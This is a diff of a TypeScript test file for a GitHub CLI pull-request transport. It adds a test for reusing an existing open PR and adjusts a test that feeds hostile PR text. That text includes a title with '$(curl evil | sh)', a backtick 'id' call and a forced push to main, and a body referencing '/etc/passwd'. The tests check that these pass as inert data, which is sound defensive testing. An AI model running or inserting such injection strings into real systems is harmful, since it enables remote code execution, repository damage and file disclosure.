@@ -66,16 +66,36 @@ describe("gh api write transport", () => {
 
   it("forces base=main and keeps hostile PR text as single data arguments", async () => {
     const pr = { number: 5, state: "open", draft: false, head: { ref: BRANCH, sha: SHA }, base: { ref: "main" } };
-    const { r, specs } = runner([{ stdout: JSON.stringify(pr) }]);
+    const { r, specs } = runner([
+      { stdout: "[]" },
+      { stdout: JSON.stringify(pr) },
+    ]);
     const title = "$(curl evil | sh); `id` && git push --force origin main";
     await createGhCliWriteTransport(r, "/repo").createPullRequest(REPO, { base: "main", head: BRANCH, title, body: "@/etc/passwd", draft: false });
-    const args = specs[0].args;
+    const args = specs[1].args;
     expect(args).toContain(`title=${title}`);
     expect(args).toContain("body=@/etc/passwd");
     expect(args).toContain("base=main");
     expect(args[args.indexOf("body=@/etc/passwd") - 1]).toBe("-f"); // raw string field, never a file reference
     expect(args.filter((a) => a === "-F")).toHaveLength(1);
     expect(args).toContain("draft=false");
+  });
+
+  it("reuses the one open PR for the same head/base instead of creating a duplicate", async () => {
+    const pr = { number: 5, state: "open", draft: false, head: { ref: BRANCH, sha: SHA }, base: { ref: "main" } };
+    const { r, specs } = runner([{ stdout: JSON.stringify([pr]) }]);
+    expect(
+      await createGhCliWriteTransport(r, "/repo").createPullRequest(REPO, {
+        base: "main",
+        head: BRANCH,
+        title: "smoke",
+        body: "test-only",
+        draft: false,
+      }),
+    ).toMatchObject({ number: 5, head: { ref: BRANCH, sha: SHA } });
+    expect(specs).toHaveLength(1);
+    expect(specs[0].args.join(" ")).toContain("pulls?state=open");
+    expect(specs[0].args).not.toContain("POST");
   });
 
   it("refuses PR head main and non-main base", async () => {
